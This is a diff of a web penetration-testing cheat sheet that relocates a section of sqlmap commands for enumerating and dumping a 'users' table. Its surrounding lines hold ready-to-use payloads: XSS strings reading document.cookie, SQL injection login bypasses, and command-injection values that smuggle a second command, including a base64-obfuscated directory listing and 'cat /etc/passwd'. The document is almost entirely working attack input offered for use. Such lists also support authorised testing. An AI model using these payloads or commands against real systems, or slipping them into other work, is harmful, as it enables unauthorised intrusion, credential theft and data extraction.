@@ -173,26 +173,6 @@ javascript:alert(document.cookie)
 </><TAG/EVENT="">
 <iframe src="https://$TARGET/?search=%22%3E%3Cbody%20onresize%3Dalert%28document%2Ecookie%29%3E" onload=this.style.width='0px'>
 
-[*] HTTP Methods
-GET
-HEAD
-POST
-PUT
-DELETE
-CONNECT
-OPTIONS
-TRACE
-PATCH
-
-[*] Headers
-X-Forwarded-For: 1
-
-[*] sqlmap
-sqlmap -r request --batch --level 3 -dbs
-sqlmap -r request --batch --level 3 -D temp_db --tables
-sqlmap -r request --batch --level 3 -D temp_db -T users --columns
-sqlmap -r request --batch --level 3 -D temp_db -T users --columns --dump
-
 [*] SQLi
 ' OR 1=1 -- #
 OR 1=1 -- #
@@ -223,6 +203,26 @@ username=target';-- # &password1=test&password2=test
 ;ls -laR "$(echo 'Li4vLi4vLi4vLi4vLi4vCg==' | base64 -d)"
 logname=;cat /etc/passwd > log.txt
 &amp;id
+
+[*] HTTP Methods
+GET
+HEAD
+POST
+PUT
+DELETE
+CONNECT
+OPTIONS
+TRACE
+PATCH
+
+[*] Headers
+X-Forwarded-For: 1
+
+[*] sqlmap
+sqlmap -r request --batch --level 3 -dbs
+sqlmap -r request --batch --level 3 -D temp_db --tables
+sqlmap -r request --batch --level 3 -D temp_db -T users --columns
+sqlmap -r request --batch --level 3 -D temp_db -T users --columns --dump
 
 [*] XXE
 <?xml version="1.0" encoding="UTF-8"?>
